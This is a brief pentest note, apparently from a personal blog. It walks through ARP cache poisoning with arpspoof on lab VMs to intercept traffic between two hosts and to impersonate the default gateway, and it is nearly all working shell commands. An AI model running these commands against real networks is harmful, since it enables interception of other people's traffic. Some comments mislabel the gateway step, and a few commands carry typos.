---
title: "Arpspoof Arp Cache Poisoning"
date: 2020-05-02T18:19:48+02:00
tags:
  - hacking
  - arp
  - spoof
  - pentest
---

Goal: tricking `arp` cache to redirect network traffic to us "Man in the middle".

- VM1: 192.168.1.244
- VM2: 192.168.1.145
- GW: 192.168.1.1

## Preqrequisites

```sh
# Enable ip forwarding
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
# Ensure arpspoof is avaailable
sudo apt install dsniff
```

## Listening to traffic between two VMs from a third VM.

```sh
# Checking arp table on VM1/VM2 allow to check IP/Mac
arp -a
# Start redirecting traffic from VM1 to VM2 to us
sudo arpspoof -i eth0 -t $VM1 $VM2
# Start redirecting traffic from VM2 to VM1 to us
sudo arpspoof -i eth0 -t $VM2 $VM1
# Checking arp table on VM1/VM2 allow to check IP/Mac
arp -a
# Using wireshark will allow to check/follow traffic
sudo whireshark
```

## Pretending to be the default gateway

```sh
# Checking arp table allow to check IP/Mac
arp -a
# Start redirecting traffic from VM1 to VM2 to us
sudo arpspoof -i eth0 -t $VM1 $GW
# Start redirecting traffic from VM2 to VM1 to us
sudo arpspoof -i eth0 -t $GW $VM1
# Using wireshark will allow to check/follow traffic
sudo whireshark
```
